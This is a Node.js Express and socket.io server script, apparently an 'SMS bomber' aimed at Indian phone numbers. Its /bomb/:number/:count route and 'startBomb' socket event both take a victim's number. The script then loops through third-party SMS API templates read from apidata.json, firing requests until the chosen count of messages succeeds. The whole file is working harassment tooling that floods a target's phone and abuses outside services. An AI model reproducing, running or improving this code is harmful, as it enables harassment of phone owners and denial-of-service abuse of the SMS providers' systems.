#!/usr/bin/env node

const express = require('express')
const socketIO = require('socket.io'); 
const fs = require('fs');
const axios = require('axios');
const http = require('http');

const app = express()
let server = http.createServer(app)
const port = process.env.PORT||3000
let io = socketIO(server) 
server.listen(port,()=>{
   console.log('Visit localhost:'+port);
});


app.use(express.static(__dirname + "/public"));
app.get('/bomb/:number/:count', function (req, res) {
    res.setHeader('Content-Type', 'application/json');
    var number =  req.params.number;
    var count = req.params.count || 1;
    sendSms(number,count,res);
})






io.on('connection', (socket)=>{
    console.log('New user connected');
    socket.on('startBomb', (data)=>{ 
        sendSms(data.number,data.count,socket) 
    }); 
});







async function sendSms(number,count=1,socket){
    var success=0,failed=0;
fs.readFile('apidata.json',async (err,data) =>{
    if(err) throw err;

    while(success<count){
        var nom = Math.floor((Math.random() * 10) + 1);
                var json = JSON.stringify(JSON.parse(data).sms[91][nom]).replace(/{target}/g,number).replace(/{cc}/g,"91");
       json = JSON.parse(json);
    
        var newdata = {
            url:json.url,
            method:json.method,
            data:json.data,
            headers:json.headers,
            timeout:6000
        }
        var identifier = json.identifier;
        try {
           var request = await axios(newdata);
        } catch(err){
        }
        var resp = JSON.stringify(request.data)
        verified = resp.includes(identifier)
        if(verified){
            success++
            var json = {
                "success":success
            }
            socket.emit('bombing',json);
        } else{
            failed++;
        } 
   }
})
}
